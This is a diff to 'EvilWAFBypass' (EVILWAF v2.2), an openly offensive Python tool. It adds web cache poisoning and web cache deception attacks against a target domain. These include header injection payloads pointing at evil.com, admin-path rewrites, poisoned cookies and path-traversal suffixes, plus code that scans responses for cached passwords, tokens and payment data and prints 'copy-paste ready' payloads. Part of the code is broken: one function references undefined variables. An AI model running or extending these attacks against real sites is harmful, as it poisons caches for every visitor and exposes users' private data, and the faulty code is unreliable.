+                'headers': {'X-Forwarded-Host': 'evil.com'},
+                'description': 'X-Forwarded-Host injection'
+            },
+            {
+                'headers': {'Host': 'evil.com'},
+                'description': 'Host header injection'
+            },
+            {
+                'headers': {'X-Forwarded-Scheme': 'http'},
+                'description': 'Scheme downgrade attack'
+            },
+            {
+                'headers': {'X-Original-URL': '/admin'},
+                'description': 'X-Original-URL injection'
+            },
+            {
+                'headers': {'X-Rewrite-URL': '/admin'},
+                'description': 'X-Rewrite-URL injection'
+            },
+            # Cache Key Poisoning
+            {
+                'headers': {'X-Forwarded-Port': '80'},
+                'description': 'Port manipulation'
+            },
+            {
+                'headers': {'X-Forwarded-Proto': 'http'},
+                'description': 'Protocol downgrade'
+            },
+            {
+                'headers': {'Accept-Encoding': 'gzip, deflate, br'},
+                'description': 'Encoding variation'
+            },
+            {
+                'headers': {'Accept-Language': 'en-US,en;q=0.9'},
+                'description': 'Language variation'
+            },
+            # Cache Buster Techniques
+            {
+                'headers': {'X-Cache-Buster': 'random123'},
+                'description': 'Cache buster header'
+            },
+            {
+                'headers': {'X-Request-ID': 'poison123'},
+                'description': 'Request ID poisoning'
+            },
+            # Cookie Poisoning
+            {
+                'headers': {'Cookie': 'session=poisoned; user=admin'},
+                'description': 'Cookie poisoning'
+            },
+            # User-Agent Variations
+            {
+                'headers': {'User-Agent': 'Mozilla/5.0 (EvilBot/1.0)'},
+                'description': 'Malicious User-Agent'
+            },
+            # Referer Poisoning
+            {
+                'headers': {'Referer': 'https://evil.com/phishing'},
+                'description': 'Referer poisoning'
+            },
+            # Cache Control Manipulation
+            {
+                'headers': {'Cache-Control': 'no-cache'},
+                'description': 'Cache control override'
+            },
+            {
+                'headers': {'Pragma': 'no-cache'},
+                'description': 'Pragma header poisoning'
+            },
+            # API Cache Poisoning
+            {
+                'headers': {'X-API-Version': 'v2'},
+                'description': 'API version poisoning'
+            },
+            {
+                'headers': {'Accept': 'application/json'},
+                'description': 'Content type poisoning'
+            },
+            # Geographic Poisoning
+            {
+                'headers': {'X-Country-Code': 'US'},
+                'description': 'Geo-location poisoning'
+            },
+            {
+                'headers': {'CF-IPCountry': 'US'},
+                'description': 'Cloudflare geo-poisoning'
+            },
+            # Mobile Cache Poisoning
+            {
+                'headers': {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'},
+                'description': 'Mobile cache poisoning'
+            },
+            # Browser-Specific Poisoning
+            {
+                'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59'},
+                'description': 'Edge browser poisoning'
+            },
+        ]
+    
+        successful_poisons = []
+        vulnerable_endpoints = []
+    
+        print(f"{Colors.WHITE}[*] Testing {len(cache_poisoning_payloads)} cache poisoning techniques{Colors.END}")
+    
+        # Test endpoints that are commonly cached
+        test_endpoints = [
+            '/', '/index.html', '/home', '/main',
+            '/api/data', '/api/users', '/api/config',
+            '/static/js/app.js', '/static/css/style.css',
+            '/images/logo.png', '/favicon.ico',
+            '/blog', '/news', '/articles',
+            '/product/1', '/user/profile'
+        ]
+    
+        for payload in cache_poisoning_payloads:
+            try:
+                poison_success = await self.test_cache_poisoning(domain, payload, test_endpoints)
+            
+                if poison_success['success']:
+                   successful_poisons.append({
+                    'payload': payload,
+                    'endpoint': poison_success['endpoint'],
+                    'evidence': poison_success['evidence']
+                  })
+
+                   print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.GREEN}Poisoned {poison_success['endpoint']}{Colors.END}")
+                                                                      
+                else:
+                    print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.RED}Failed{Colors.END}")
+                
+            except Exception as e:
+                print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.RED}ERROR: {str(e)[:30]}{Colors.END}")
+        
+            await asyncio.sleep(0.3)
+    
+            # Print comprehensive results
+        await self.print_cache_poisoning_results(successful_poisons)
+    
+        return successful_poisons
+
+
+
+
+
+
+
+
+    async def test_cache_poisoning(self, domain, payload, endpoints):
+        """Test individual cache poisoning technique"""
+        for endpoint in endpoints:
+            try:
+                # First request - poison the cache
+                poison_headers = {
+                'User-Agent': self.get_random_ua(),
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                }
+                poison_headers.update(payload['headers'])
+            
+                # Send poisoning request
+                async with self.session.get(
+                f"https://{domain}{endpoint}", 
+                headers=poison_headers, 
+                timeout=8, 
+                ssl=False
+                ) as poison_response:
+                
+                    poison_status = poison_response.status
+                    poison_content = await poison_response.text()
+                    poison_headers_received = dict(poison_response.headers)
+                
+                    # Check for cache headers that indicate success
+                    cache_indicators = self.analyze_cache_poisoning(
+                    poison_status, poison_content, poison_headers_received, payload
+                    )
+                
+                    if cache_indicators['is_poisoned']:
+                       return {
+                           'success': True,
+                           'endpoint':     endpoint,
+                           'evidence':  cache_indicators['evidence']
+                       }
+                    
+            except Exception as e:
+                continue
+    
+        return {'success': False, 'endpoint': '', 'evidence': ''}
+
+
+
+
+
+
+
+
+
+
+    def analyze_cache_poisoning(self, status, content, headers, payload):
+        """Analyze if cache poisoning was successful"""
+        evidence = []
+        is_poisoned = False
+    
+        # Check for cache-related headers
+        cache_headers = ['cache-control', 'x-cache', 'x-cache-hits', 'cf-cache-status', 'age', 'expires']
+    
+        for header in cache_headers:
+            if header in headers:
+                evidence.append(f"{header}: {headers[header]}")
+    
+        # Status code analysis
+        if status in [200, 301, 302, 304, 403, 404]:
+            evidence.append(f"Status: {status}")
+    
+        # Content-based indicators
+        content_indicators = [
+            'evil.com' in content,
+            'poison' in content.lower(),
+            'admin' in content.lower(),
+            payload['description'].lower() in content.lower()
+        ]
+    
+        if any(content_indicators):
+            evidence.append("Content modified")
+            is_poisoned = True
+    
+        # Cache-specific indicators
+        cache_status = headers.get('x-cache', '').lower()
+        cf_cache = headers.get('cf-cache-status', '').lower()
+    
+        if 'hit' in cache_status or 'hit' in cf_cache:
+            evidence.append("Cache hit detected")
+            is_poisoned = True
+    
+        if 'age' in headers and int(headers.get('age', 0)) > 0:
+            evidence.append(f"Cache age: {headers['age']}")
+            is_poisoned = True
+    
+        # Header reflection check
+        for header_name, header_value in  payload['headers'].items():
+            if header_value in content:
+                evidence.append(f"Header reflected: {header_name}")
+                is_poisoned = True
+    
+        return {
+            'is_poisoned': is_poisoned,
+            'evidence': evidence
+        }
+
+
+
+
+
+
+
+
+
+    async def print_cache_poisoning_results(self, successful_poisons):
+        """Print comprehensive cache poisoning results"""
+        print(f"\033[45m[+] CACHE POISONING ATTACK RESULTS\033[0m")
+        
+        if successful_poisons:
+            print(f"{Colors.GREEN}[*] Successful Cache Poisoning Attacks: {len(successful_poisons)}{Colors.END}\n")
+        
+            for i, poison in enumerate(successful_poisons, 1):
+                payload = poison['payload']
+                print(f"{Colors.WHITE}{i}. {payload['description']}{Colors.END}")
+                print(f"   {Colors.CYAN}Endpoint: {poison['endpoint']}{Colors.END}")
+                print(f"   {Colors.YELLOW}Evidence: {', '.join(poison['evidence'])}{Colors.END}")
+                print(f"   {Colors.WHITE}Headers: {payload['headers']}{Colors.END}\n")
+        else:
+            print(f"{Colors.RED}[*] No successful cache poisoning attacks{Colors.END}")
+    
+        # Additional cache analysis
+        print(f"{Colors.CYAN}[*] Cache Poisoning Impact Analysis:{Colors.END}")
+        print(f"{Colors.WHITE}   • Header Injection: Can poison cache keys{Colors.END}")
+        print(f"{Colors.WHITE}   • Cache Bypass: May bypass WAF through cached responses{Colors.END}")
+        print(f"{Colors.WHITE}   • Persistent Attack: Poisoned cache affects all users{Colors.END}")
+        print(f"{Colors.WHITE}   • Data Theft: Can steal sensitive data via cache{Colors.END}")
+    
+
+
+
+
+
+
+
+
+    async def advanced_cache_poisoning(self, domain):
+        """Advanced Cache Poisoning with Web Cache Deception"""
+        print(f"\033[45m PHASE 13: Advanced Cache Poisoning - Web Cache Deception\033[0m")
+    
+        deception_payloads = [
+            # Path-based cache deception
+            {'url_suffix': '/.css', 'description': 'CSS extension deception'},
+            {'url_suffix': '/.js', 'description': 'JS extension deception'},
+            {'url_suffix': '/.png', 'description': 'Image extension deception'},
+            {'url_suffix': '/.json', 'description': 'JSON extension deception'},
+            {'url_suffix': '/%2e%2e/', 'description': 'URL encoding deception'},
+            {'url_suffix': '/..;/', 'description': 'Path traversal deception'},
+            {'url_suffix': '/?cache=buster', 'description': 'Parameter-based caching'},
+            {'url_suffix': '/#fragment', 'description': 'Fragment-based caching'},
+        ]
+    
+        successful_deceptions = []
+    
+        for payload in deception_payloads:
+            try:
+                deception_result = await self.test_web_cache_deception(domain, payload)
+            
+                if deception_result['success']:
+                      successful_deceptions.append(deception_result)
+                      print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.GREEN}Deception Success{Colors.END}")
+                else:
+                      print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.RED}Failed{Colors.END}")
+                
+            except Exception as e:
+                    print(f"{Colors.WHITE}[-] {payload['description']:<40} {Colors.RED}ERROR{Colors.END}")
+        
+            await asyncio.sleep(0.3)
+    
+        return successful_deceptions
+
+
+
+
+
+
+
+    async def test_web_cache_deception(self, domain, payload):
+        """Test Web Cache Deception techniques"""
+        test_paths = ['/profile', '/account', '/user', '/admin', '/dashboard']
+    
+        for path in test_paths:
+            try:
+                deception_url = f"https://{domain}{path}{payload['url_suffix']}"
+            
+                async with self.session.get(
+                    deception_url,
+                    headers={'User-Agent': self.get_random_ua()},
+                    timeout=8,
+                    ssl=False
+                ) as response:
+                
+                    content = await response.text()
+                    headers = dict(response.headers)
+                
+                    # Check for caching indicators
+                    if self.is_cache_deception_successful(response.status, content, headers):
+                        return {
+                            'success': True,
+                            'technique':  payload['description'],
+                       'url': deception_url,
+                       'status': response.status
+                        }
+                    
+            except Exception:
+                continue
+    
+        await self.print_cache_poisoning_summary(domain, results, deception_payloads)
+        return {'success': False}
+
+
+
+
+    def is_cache_deception_successful(self, status, content, headers):
+        """Improved cache deception detection with comprehensive status handling"""
+    
+        
+        valid_statuses = [200, 301, 302, 304, 403, 404]
+    
+        if status not in valid_statuses:
+            return False
+    
+        
+        cache_indicators = [
+            'x-cache' in headers,
+            'cf-cache-status' in headers,
+            'akamai-cache-status' in headers,
+            'fastly-cache-status' in headers,
+            'age' in headers and int(headers.get('age', 0)) > 0,
+            'x-cache-hits' in headers,
+            'via' in headers and 'cache' in headers['via'].lower(),
+            'cache-control' in headers and any(x in headers['cache-control'].lower() for x in ['public', 'max-age', 's-maxage']),
+            'expires' in headers,
+            'last-modified' in headers,
+            'etag' in headers
+        ]
+    
+        # Check for specific cache HIT status
+        cache_hit_indicators = [
+            headers.get('x-cache', '').lower() in ['hit', 'hit from', 'hit_fresh'],
+            headers.get('cf-cache-status', '').lower() in ['hit', 'hitt'],
+            headers.get('akamai-cache-status', '').lower() in ['hit', 'cached'],
+            'age' in headers and int(headers.get('age', 0)) > 10  # Cache ya zaidi ya sekunde 10
+        ]
+    
+        # Sensitive content indicators - expanded
+        sensitive_content_indicators = [
+        # User data
+            'password' in content.lower(),
+            'email' in content.lower(),
+            'username' in content.lower(),
+            'user' in content.lower() and ('profile' in content.lower() or 'account' in content.lower()),
+        
+            # Admin/Session data
+            'admin' in content.lower(),
+            'session' in content.lower(),
+            'token' in content.lower(),
+            'csrf' in content.lower(),
+        
+             # Personal information
+            'address' in content.lower(),
+            'phone' in content.lower(),
+            'credit' in content.lower() and 'card' in content.lower(),
+        
+            # API/Sensitive endpoints
+            'api' in content.lower() and ('key' in content.lower() or 'secret' in content.lower()),
+            'config' in content.lower(),
+            'database' in content.lower(),
+        
+            # Authentication
+            'login' in content.lower(),
+            'auth' in content.lower(),
+            'authenticate' in content.lower(),
+        
+            # Financial data
+            'balance' in content.lower(),
+            'payment' in content.lower(),
+            'transaction' in content.lower()
+        ]
+    
+        # Additional deception patterns
+        deception_patterns = [
+        # Content mismatch (CSS/JS file with HTML content)
+            len(content) > 1000 and any(ext in headers.get('content-type', '') for ext in ['css', 'javascript']),
+        
+            # Unexpected status codes for static resources
+            status == 200 and any(ext in headers.get('content-type', '') for ext in ['html', 'json']) and any(pattern in content for pattern in ['<html', '{', '"data"']),
+        
+            # Cache with sensitive headers
+            any(cache_hit_indicators) and any(cookie in headers.get('set-cookie', '') for cookie in ['session', 'auth', 'token']),
+        
+            # Redirect caching with sensitive data
+            status in [301, 302] and any(cache_indicators) and 'location' in headers and any(sensitive in headers['location'] for sensitive in ['admin', 'dashboard', 'profile'])
+        ]
+    
+        # Success conditions - flexible based on different scenarios
+        success_conditions = [
+            # Scenario 1: Cache hit + sensitive content
+            (any(cache_hit_indicators) and any(sensitive_content_indicators)),
+        
+           # Scenario 2: Any cache + strong sensitive content
+           (any(cache_indicators) and sum(sensitive_content_indicators) >= 2),
+        
+           # Scenario 3: Deception patterns detected
+           (any(deception_patterns)),
+        
+           # Scenario 4: Cache with admin/authentication content
+           (any(cache_indicators) and any(keyword in content.lower() for keyword in ['admin', 'dashboard', 'control panel'])),
+        
+           # Scenario 5: Cached error pages with sensitive info (403/404 cached with data)
+           (status in [403, 404] and any(cache_indicators) and any(sensitive_content_indicators)),
+        
+           # Scenario 6: Redirect caching to sensitive locations
+           (status in [301, 302] and any(cache_indicators) and any(sensitive in headers.get('location', '') for sensitive in ['admin', 'login', 'dashboard']))
+        ]
+    
+        return any(success_conditions)
+
+
+
+
+
+    
+    async def print_cache_poisoning_summary(self, domain, results, deception_payloads):
+        """Print detailed summary for Advanced Cache Poisoning attacks"""
+        
+        def print_bg_header(text, bg_color):
+            import shutil
+            try:
+                width = shutil.get_terminal_size().columns
+            except:
+                width = 80
+            padding = (width - len(text)) // 2
+            spaces = " " * padding + text + " " * (width - len(text) - padding)
+            print(f"{bg_color}{Colors.BLACK}{spaces}{Colors.END}")
+        
+        # 
+        print_bg_header("", '\033[45m')
+        print_bg_header(" ADVANCED CACHE POISONING - WEB CACHE DECEPTION SUMMARY ", '\033[45m')
+        print_bg_header("", '\033[45m')
+        
+        print(f"\n{Colors.MAGENTA}[+] Generating Cache Poisoning summary...{Colors.END}")
+        await asyncio.sleep(1)
+        
+        # CALCULATE STATISTICS
+        total_payloads = len(deception_payloads)
+        success_payloads = len(results)
+        success_rate = (success_payloads / total_payloads) * 100 if total_payloads > 0 else 0
+        
+
+        print(f"\n{Colors.MAGENTA}{'CACHE DECEPTION STATISTICS':<30} {'COUNT':<8} {'PERCENTAGE':<12}{Colors.END}")
+        print(f"{Colors.MAGENTA}{'─'*30} {'─'*8} {'─'*12}{Colors.END}")
+        
+        print(f"{Colors.WHITE}{'Total Techniques Tested':<30}{Colors.END} {Colors.YELLOW}{total_payloads:<8}{Colors.END} {Colors.MAGENTA}100.0%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Successful Deceptions':<30}{Colors.END} {Colors.GREEN}{success_payloads:<8}{Colors.END} {Colors.MAGENTA}{success_rate:6.1f}%{'':<6}{Colors.END}")
+        print(f"{Colors.WHITE}{'Failed Deceptions':<30}{Colors.END} {Colors.RED}{total_payloads-success_payloads:<8}{Colors.END} {Colors.MAGENTA}{(100-success_rate):6.1f}%{'':<6}{Colors.END}")
+        
+        await asyncio.sleep(0.5)
+        
+
+        if results:
+            print(f"\n{Colors.GREEN}{'SUCCESSFUL CACHE DECEPTION TECHNIQUES':<80}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
+            
+            for i, result in enumerate(results, 1):
+                technique = result['technique']
+                url = result['url']
+                status = result['status']
+                
+                print(f"\n{Colors.WHITE}{i:>2}. {technique:<40}{Colors.END}")
+                print(f"{Colors.CYAN}    URL: {url}{Colors.END}")
+                print(f"{Colors.YELLOW}    Status: {status:<6} | Type: {self.get_deception_type(technique)}{Colors.END}")
+                
+                # SHOW PAYLOAD USED
+                payload_used = self.find_payload_by_description(deception_payloads, technique)
+                if payload_used:
+                    print(f"{Colors.MAGENTA}    Payload: {payload_used['url_suffix']}{Colors.END}")
+        
+
+        print(f"\n{Colors.BLUE}{'DETAILED PAYLOAD ANALYSIS (ALL TECHNIQUES)':<80}{Colors.END}")
+        print(f"{Colors.BLUE}{'─'*80}{Colors.END}")
+        
+        for i, payload in enumerate(deception_payloads, 1):
+            description = payload['description']
+            url_suffix = payload['url_suffix']
+            
+
+            is_successful = any(result['technique'] == description for result in results)
+            status = "[*]UCCESS" if is_successful else "[*]AILED"
+            status_color = Colors.GREEN if is_successful else Colors.RED
+            
+            payload_type = self.get_payload_type(url_suffix)
+            payload_size = len(url_suffix.encode('utf-8'))
+            
+            print(f"\n{Colors.WHITE}{i:>2}. {description:<40} {Colors.CYAN}{payload_type:<15} {status_color}{status:<10}{Colors.END}")
+            print(f"{Colors.CYAN}    Suffix: {url_suffix:<20} | Size: {payload_size:2} bytes{Colors.END}")
+            
+            # SHOW COPY-READY FORMAT FOR SUCCESSFUL PAYLOADS
+            if is_successful:
+                print(f"{Colors.GREEN}    Copy: '{url_suffix}'{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.MAGENTA}{'DECEPTION TYPES BREAKDOWN':<25} {'SUCCESS':<8} {'TOTAL':<8} {'RATE':<12}{Colors.END}")
+            print(f"{Colors.MAGENTA}{'─'*25} {'─'*8} {'─'*8} {'─'*12}{Colors.END}")
+            
+            type_stats = {}
+            
+            # COUNT SUCCESS BY TYPE
+            for result in results:
+                payload_type = self.get_payload_type_from_result(result, deception_payloads)
+                if payload_type not in type_stats:
+                    type_stats[payload_type] = {'success': 0, 'total': 0}
+                type_stats[payload_type]['success'] += 1
+            
+            # COUNT TOTAL BY TYPE
+            for payload in deception_payloads:
+                payload_type = self.get_payload_type(payload['url_suffix'])
+                if payload_type not in type_stats:
+                    type_stats[payload_type] = {'success': 0, 'total': 0}
+                type_stats[payload_type]['total'] += 1
+            
+            for payload_type, stats in type_stats.items():
+                success_count = stats['success']
+                total_count = stats['total']
+                success_rate = (success_count / total_count) * 100 if total_count > 0 else 0
+                
+                rate_color = Colors.GREEN if success_rate >= 50 else Colors.YELLOW if success_rate >= 25 else Colors.RED
+                
+                print(f"{Colors.WHITE}{payload_type:<25}{Colors.END} {Colors.GREEN}{success_count:<8}{Colors.END} {Colors.CYAN}{total_count:<8}{Colors.END} {rate_color}{success_rate:6.1f}%{'':<6}{Colors.END}")
+        
+
+        await asyncio.sleep(0.5)
+        
+        if deception_payloads:
+            print(f"\n{Colors.CYAN}{'PAYLOAD SIZE ANALYSIS':<25} {'SIZE':<10} {'TYPE':<15}{Colors.END}")
+            print(f"{Colors.CYAN}{'─'*25} {'─'*10} {'─'*15}{Colors.END}")
+            
+            sizes = [len(p['url_suffix'].encode('utf-8')) for p in deception_payloads]
+            avg_size = sum(sizes) / len(sizes)
+            min_size = min(sizes)
+            max_size = max(sizes)
+            
+            print(f"{Colors.WHITE}{'Average Size':<25}{Colors.END} {Colors.YELLOW}{avg_size:6.1f} chars{'':<4}{Colors.END} {Colors.CYAN}{'ALL PAYLOADS':<15}{Colors.END}")
+            print(f"{Colors.WHITE}{'Smallest Payload':<25}{Colors.END} {Colors.GREEN}{min_size:6} chars{'':<4}{Colors.END} {Colors.CYAN}{'MINIMUM':<15}{Colors.END}")
+            print(f"{Colors.WHITE}{'Largest Payload':<25}{Colors.END} {Colors.RED}{max_size:6} chars{'':<4}{Colors.END} {Colors.CYAN}{'MAXIMUM':<15}{Colors.END}")
+            
+            # SUCCESSFUL PAYLOAD SIZES
+            successful_sizes = [len(self.find_payload_by_description(deception_payloads, r['technique'])['url_suffix'].encode('utf-8')) 
+                              for r in results if self.find_payload_by_description(deception_payloads, r['technique'])]
+            if successful_sizes:
+                avg_success_size = sum(successful_sizes) / len(successful_sizes)
+                print(f"{Colors.WHITE}{'Avg Successful Size':<25}{Colors.END} {Colors.GREEN}{avg_success_size:6.1f} chars{'':<4}{Colors.END} {Colors.GREEN}{'SUCCESSFUL':<15}{Colors.END}")
+        
+
+        if results:
+            print(f"\n{Colors.GREEN}{'COPY-PASTE READY PAYLOADS (SUCCESSFUL ONLY)':<80}{Colors.END}")
+            print(f"{Colors.GREEN}{'─'*80}{Colors.END}")
+            print(f"{Colors.CYAN}# Use these deception techniques in your code:{Colors.END}\n")
+            
+            for i, result in enumerate(results, 1):
+                technique = result['technique']
+                payload = self.find_payload_by_description(deception_payloads, technique)
+                
+                if payload:
+                    url_suffix = payload['url_suffix']
+                    payload_size = len(url_suffix.encode('utf-8'))
+                    
+                    print(f"{Colors.YELLOW}# {technique} ({payload_size} chars){Colors.END}")
+                    print(f"{Colors.WHITE}payload_{i} = '{url_suffix}'{Colors.END}")
+                    print(f"{Colors.CYAN}# Usage: /profile{url_suffix} or /account{url_suffix}{Colors.END}")
+                    print()
+        
+
+        await asyncio.sleep(0.5)
+        
+        if results:
+            print(f"\n{Colors.RED}{'SECURITY IMPACT ASSESSMENT':<40} {'SEVERITY':<15} {'RISK':<15}{Colors.END}")
+            print(f"{Colors.RED}{'─'*40} {'─'*15} {'─'*15}{Colors.END}")
+            
+            impacts = []
+            
+
+            extension_deceptions = sum(1 for r in results if any(ext in r['technique'] for ext in ['.css', '.js', '.png', '.json']))
+            if extension_deceptions > 0:
+                impacts.append((
+                    "STATIC RESOURCE DECEPTION",
+                    "HIGH",
+                    "SENSITIVE DATA LEAK"
+                ))
+            
+            encoding_deceptions = sum(1 for r in results if any(enc in r['technique'] for enc in ['encoding', 'traversal']))
+            if encoding_deceptions > 0:
+                impacts.append((
+                    "PATH TRAVERSAL DECEPTION", 
+                    "MEDIUM",
+                    "UNAUTHORIZED ACCESS"
+                ))
+            
+            param_deceptions = sum(1 for r in results if 'parameter' in r['technique'].lower())
+            if param_deceptions > 0:
+                impacts.append((
+                    "PARAMETER CACHE POISONING",
+                    "LOW", 
+                    "CACHE POLLUTION"
+                ))
+            
+            fragment_deceptions = sum(1 for r in results if 'fragment' in r['technique'].lower())
+            if fragment_deceptions > 0:
+                impacts.append((
+                    "FRAGMENT CACHE ABUSE",
+                    "LOW",
+                    "CACHE INJECTION"
+                ))
+            
+            for impact, severity, risk in impacts:
+                severity_color = Colors.RED if severity == "HIGH" else Colors.YELLOW if severity == "MEDIUM" else Colors.GREEN
+                print(f"{Colors.WHITE}{impact:<40}{Colors.END} {severity_color}{severity:<15}{Colors.END} {Colors.CYAN}{risk:<15}{Colors.END}")
+        
+
+        print()
+        print_bg_header("", '\033[45m')
+        print_bg_header(f" CACHE POISONING SCAN COMPLETED ", '\033[45m')
+        print_bg_header(f" {success_rate:.1f}% SUCCESS RATE ({success_payloads}/{total_payloads}) ", '\033[45m')
+        print_bg_header(f" {len(deception_payloads)} TECHNIQUES ANALYZED ", '\033[45m')
+        print_bg_header("", '\033[45m')
+
+    def get_deception_type(self, technique):
+        """Get deception type from technique description"""
+        if any(ext in technique for ext in ['.css', '.js', '.png', '.json']):
+            return "EXTENSION DECEPTION"
+        elif any(enc in technique for enc in ['encoding', 'traversal']):
+            return "ENCODING DECEPTION"
+        elif 'parameter' in technique.lower():
+            return "PARAMETER DECEPTION"
+        elif 'fragment' in technique.lower():
+            return "FRAGMENT DECEPTION"
+        else:
+            return "GENERIC DECEPTION"
+
+    def get_payload_type(self, url_suffix):
+        """Get payload type from URL suffix"""
+        if any(ext in url_suffix for ext in ['.css', '.js', '.png', '.json']):
+            return "EXTENSION"
+        elif any(enc in url_suffix for enc in ['%2e', '..', ';/']):
+            return "ENCODING"
+        elif '?' in url_suffix:
+            return "PARAMETER"
+        elif '#' in url_suffix:
+            return "FRAGMENT"
+        else:
+            return "PATH"
+
+    def get_payload_type_from_result(self, result, deception_payloads):
+        """Get payload type from result"""
+        payload = self.find_payload_by_description(deception_payloads, result['technique'])
+        if payload:
+            return self.get_payload_type(payload['url_suffix'])
+        return "UNKNOWN"
+
+    def find_payload_by_description(self, deception_payloads, description):
+        """Find payload by description"""
+        for payload in deception_payloads:
+            if payload['description'] == description:
+                return payload
+        return None
+
+
+
+
+
+
+
+    
+
 
     async def ultimate_bypass(self, domain, output_file=None):
         """Ultimate bypass attack with ALL techniques"""
@@ -2181,9 +4864,9 @@ class EvilWAFBypass:
             
             
             all_results['subdomains'] = await self.test_valid_subdomains(domain, valid_subs)
-            
-            
-            
+               
+ 
+
             
             all_results['dns_history'] = await self.dns_history_bypass(domain)
             
@@ -2217,6 +4900,18 @@ class EvilWAFBypass:
               
             all_results['wasm_memory'] = await self.wasm_memory_corruption(domain)
               
+            all_results['cache_poisoning'] = await self.cache_poisoning_attack(domain)          
+          
+          
+            all_results['web_cache_deception'] = await self.advanced_cache_poisoning(domain)     
+
+
+              
+
+
+
+
+
 
 
 
@@ -2271,7 +4966,7 @@ class EvilWAFBypass:
 def show_usage():
     usage = f"""
 {Colors.WHITE}
-EVILWAF v2.1
+EVILWAF v2.2
 ------------
 
 {Colors.WHITE}Usage:{Colors.END}
@@ -2294,6 +4989,8 @@ EVILWAF v2.1
   •JWT Algorithm Confusion
   •HTTP/2 Stream Multiplexing
   •WebAssembly Memory Corruption
+  •cache poisoning
+  •web cache poisoning
   
   High risk: Potential Exploitation
   •SSTI Polyglot Payloads
@@ -2327,8 +5024,8 @@ def main():
     args = parser.parse_args()
     
     if args.update:
-        print(f"{Colors.YELLOW}[*] Update functionality would be implemented here{Colors.END}")
-        sys.exit(0)
+        updater()
+        quit()  
      
     if args.help or not args.domain:
         show_banner()
@@ -2351,5 +5048,6 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
